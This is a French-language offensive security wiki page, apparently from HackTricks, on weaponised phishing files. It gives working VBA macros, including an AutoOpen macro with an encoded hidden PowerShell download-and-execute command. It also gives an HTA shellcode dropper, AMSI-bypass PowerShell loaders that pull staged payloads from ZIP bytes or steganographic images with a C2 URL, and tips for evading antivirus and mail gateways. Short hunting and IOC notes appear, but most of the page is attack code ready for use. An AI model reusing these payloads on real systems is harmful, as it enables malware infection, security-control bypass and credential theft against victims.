# Fichiers & documents de phishing

{{#include ../../banners/hacktricks-training.md}}

## Documents Office

Microsoft Word effectue une validation des données du fichier avant d'ouvrir un fichier. La validation des données est réalisée sous forme d'identification de la structure des données, conformément à la norme OfficeOpenXML. Si une erreur survient lors de l'identification de la structure de données, le fichier analysé ne sera pas ouvert.

D'ordinaire, les fichiers Word contenant des macros utilisent l'extension `.docm`. Cependant, il est possible de renommer le fichier en changeant l'extension et de conserver malgré tout la capacité d'exécution des macros.\
Par exemple, un fichier RTF ne prend pas en charge les macros, par conception, mais un fichier DOCM renommé en RTF sera traité par Microsoft Word et pourra exécuter des macros.\
Les mêmes mécanismes internes s'appliquent à tous les logiciels de la Microsoft Office Suite (Excel, PowerPoint etc.).

Vous pouvez utiliser la commande suivante pour vérifier quelles extensions vont être exécutées par certains programmes Office :
```bash
assoc | findstr /i "word excel powerp"
```
Les fichiers DOCX qui référencent un modèle distant (File –Options –Add-ins –Manage: Templates –Go) qui inclut des macros peuvent “execute” macros as well.

### External Image Load

Aller à : _Insert --> Quick Parts --> Field_\
_**Catégories**: Liens et références, **Noms de champ**: includePicture, et **Nom de fichier ou URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Il est possible d'utiliser des macros pour exécuter du code arbitraire depuis le document.

#### Fonctions d'autochargement

Plus elles sont courantes, plus il est probable que l'AV les détecte.

- AutoOpen()
- Document_Open()

#### Exemples de code de macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Supprimer manuellement les métadonnées

Aller à **Fichier > Informations > Inspecter le document > Inspecter le document**, ce qui ouvrira l'Inspecteur de document. Cliquez sur **Inspecter** puis sur **Supprimer tout** à côté de **Propriétés du document et informations personnelles**.

#### Extension du document

Lorsque c'est terminé, sélectionnez le menu déroulant **Save as type**, changez le format de **`.docx`** en **Word 97-2003 `.doc`**.\
Faites cela parce que vous **ne pouvez pas enregistrer de macros dans un `.docx`** et qu'il existe une **stigmatisation** à l'égard de l'extension activée par les macros **`.docm`** (par ex. l'icône miniature affiche un énorme `!` et certains gateways web/email les bloquent complètement). Par conséquent, cette **ancienne extension `.doc` est le meilleur compromis**.

#### Générateurs de macros malveillantes

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Fichiers HTA

Un HTA est un programme Windows qui **combine HTML et des langages de script (tels que VBScript et JScript)**. Il génère l'interface utilisateur et s'exécute en tant qu'application « entièrement de confiance », sans les contraintes du modèle de sécurité d'un navigateur.

Un HTA est exécuté à l'aide de **`mshta.exe`**, qui est généralement **installé** avec **Internet Explorer**, rendant **`mshta` dépendant d'IE**. Ainsi, si celui-ci a été désinstallé, les HTA ne pourront pas s'exécuter.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcer l'authentification NTLM

Il existe plusieurs façons de **forcer l'authentification NTLM "à distance"**, par exemple, vous pouvez ajouter des **images invisibles** aux emails ou au HTML que l'utilisateur ouvrira (même un MitM HTTP ?). Ou envoyer à la victime **l'adresse de fichiers** qui **déclenchera** une **authentification** simplement en **ouvrant le dossier.**

**Consultez ces idées et plus dans les pages suivantes :**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

N'oubliez pas que vous ne pouvez pas seulement voler le hash ou l'authentification, mais aussi **effectuer des NTLM relay attacks** :

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Des campagnes très efficaces livrent un ZIP qui contient deux documents leurres légitimes (PDF/DOCX) et un .lnk malveillant. L'astuce est que le véritable PowerShell loader est stocké dans les octets bruts du ZIP après un marqueur unique, et le .lnk l'extrait et l'exécute entièrement en mémoire.

Flux typique mis en œuvre par le one-liner PowerShell du .lnk :

1) Localiser le ZIP original dans des chemins courants : Desktop, Downloads, Documents, %TEMP%, %ProgramData% et le répertoire parent du dossier de travail courant.  
2) Lire les octets du ZIP et trouver un marqueur codé en dur (par ex., xFIQCV). Tout ce qui suit le marqueur est le PowerShell payload intégré.  
3) Copier le ZIP dans %ProgramData%, l'extraire là-bas, et ouvrir le .docx leurre pour paraître légitime.  
4) Bypasser AMSI pour le processus courant : [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Déobfusquer l'étape suivante (par ex., supprimer tous les caractères #) et l'exécuter en mémoire.

Exemple de squelette PowerShell pour découper et exécuter l'étape intégrée :
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Remarques
- La livraison abuse souvent de sous-domaines PaaS réputés (par ex., *.herokuapp.com) et peut restreindre les payloads (servir des ZIPs bénins selon l'IP/UA).
- L'étape suivante décrypte fréquemment du shellcode encodé en base64/XOR et l'exécute via Reflection.Emit + VirtualAlloc pour minimiser les artefacts disque.

Persistance utilisée dans la même chaîne
- COM TypeLib hijacking du Microsoft Web Browser control afin que IE/Explorer ou toute application l'intégrant relance automatiquement le payload. Voir les détails et les commandes prêtes à l'emploi ici :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Fichiers ZIP contenant la chaîne marqueur ASCII (par ex., xFIQCV) ajoutée aux données de l'archive.
- .lnk qui énumère les dossiers parent/utilisateur pour localiser le ZIP et ouvre un document leurre.
- Altération d'AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads métiers de longue durée se terminant par des liens hébergés sous des domaines PaaS de confiance.

## Steganography-delimited payloads in images (PowerShell stager)

Des chaînes de loader récentes livrent un JavaScript/VBS obfusqué qui décode et exécute un PowerShell stager encodé en Base64. Ce stager télécharge une image (souvent GIF) qui contient une .NET DLL encodée en Base64 cachée en texte brut entre des marqueurs de début/fin uniques. Le script cherche ces délimiteurs (exemples observés en nature : «<<sudo_png>> … <<sudo_odt>>>»), extrait le texte intermédiaire, le décode Base64 en octets, charge l'assembly en mémoire et invoque une méthode d'entrée connue en lui passant l'URL C2.

Workflow
- Stage 1: Archived JS/VBS dropper → décode le Base64 embarqué → lance le PowerShell stager avec -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → télécharge l'image, extrait le Base64 délimité par marqueurs, charge la .NET DLL en mémoire et appelle sa méthode (par ex. VAI) en lui passant l'URL C2 et des options.
- Stage 3: Loader récupère le payload final et l'injecte typiquement via process hollowing dans un binaire de confiance (fréquemment MSBuild.exe). Voir plus sur process hollowing et trusted utility proxy execution ici :

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemple PowerShell pour extraire une DLL depuis une image et invoquer une méthode .NET en mémoire :

<details>
<summary>Extracteur et loader de payload stego PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Remarques
- Ceci correspond à ATT&CK T1027.003 (steganography/marker-hiding). Les marqueurs varient selon les campagnes.
- Des contournements AMSI/ETW et string deobfuscation sont couramment appliqués avant le chargement de l'assembly.
- Chasse : scanner les images téléchargées à la recherche de délimiteurs connus ; identifier PowerShell accédant aux images et décodant immédiatement des blobs Base64.

Voir aussi stego tools et carving techniques :

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Une étape initiale récurrente est un petit, fortement obfusqué `.js` ou `.vbs` livré dans une archive. Son unique but est de décoder une chaîne Base64 intégrée et de lancer PowerShell avec `-nop -w hidden -ep bypass` pour démarrer la phase suivante via HTTPS.

Logique squelettique (abstraite) :
- Lire le contenu de son propre fichier
- Localiser un blob Base64 entre des chaînes inutiles
- Décoder en PowerShell ASCII
- Exécuter via `wscript.exe`/`cscript.exe` en invoquant `powershell.exe`

Signes de détection
- Pièces jointes JS/VBS archivées lançant `powershell.exe` avec `-enc`/`FromBase64String` dans la ligne de commande.
- `wscript.exe` lançant `powershell.exe -nop -w hidden` depuis les chemins temporaires utilisateur.

## Fichiers Windows pour voler NTLM hashes

Consultez la page sur **places to steal NTLM creds** :

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Références

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
